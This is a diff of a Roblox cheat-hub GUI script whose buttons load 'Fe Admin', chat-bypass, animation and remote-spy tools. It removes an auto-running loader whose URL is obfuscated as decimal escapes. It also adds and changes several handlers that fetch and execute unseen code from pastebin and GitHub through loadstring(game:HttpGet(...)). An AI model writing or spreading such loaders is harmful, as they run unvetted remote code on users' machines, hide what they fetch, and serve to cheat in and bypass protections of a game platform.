@@ -26,7 +26,6 @@ print("Loading Frames,GUI")
 MainGUI.Name = "MainGUI"
 MainGUI.Parent = game.CoreGui
 -- add more functions and male executor powerful enough
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\115\99\114\105\112\116\115\46\110\101\116\47\114\97\119\47\85\110\105\118\101\114\115\97\108\45\83\99\114\105\112\116\45\70\101\45\98\121\112\97\115\115\45\51\53\48\54\54"))()
 
 Open.Name = "Open"
 Open.Parent = MainGUI
@@ -101,6 +100,7 @@ FeNoobAll.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", En
 FeNoobAll.MouseButton1Down:Connect(function()
 	NotifyModule:Notify("does not work on some games", 5)
 	loadstring(game:HttpGet(('https://pastebin.com/raw/2NNDTLjL'),true))()
+	loadstring(game:HttpGet('https://pastebin.com/raw/9WZYR3x4'))()
 end)
 
 FeAnimR6.Name = "Fe Admin"
@@ -115,10 +115,10 @@ FeAnimR6.Text = "Fe Admin"
 FeAnimR6.TextSize = 14
 FeAnimR6.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
 FeAnimR6.MouseButton1Down:Connect(function()
-     loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/Source.lua", true))()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/NA%20testing.lua"))()
 end)
 	
-FeChatB.Name = "FeChatB"
+FeChatB.Name = "FCA"
 FeChatB.Parent = ScrollingFrame
 FeChatB.Size = UDim2.new(0, 137, 0, 23)
 FeChatB.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -126,11 +126,11 @@ FeChatB.Position = UDim2.new(0.0504385978, 0, 0.0932036042, 0)
 FeChatB.BorderSizePixel = 0
 FeChatB.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
 FeChatB.TextColor3 = Color3.fromRGB(0, 0, 0)
-FeChatB.Text = "Fe Chat Bypass"
+FeChatB.Text = "Fe Classic Anims (Reset)"
 FeChatB.TextSize = 14
 FeChatB.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
 FeChatB.MouseButton1Down:Connect(function()
-     print("noscript")
+     loadstring(game:HttpGet("https://pastebin.com/raw/pYjkmxUe", true))()
 end)
 
 FeTelekineses.Name = "UndetectedRemoteSpy"
@@ -973,7 +973,7 @@ Close.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.F
 Close.MouseButton1Down:Connect(function()
 	Open.Visible = true
 	Main_2.Visible = false
-        NotifyModule:Notify("Closed!", 2)
+    NotifyModule:Notify("Closed!", 2)
 end)
 
 print("Main Frame Loaded")
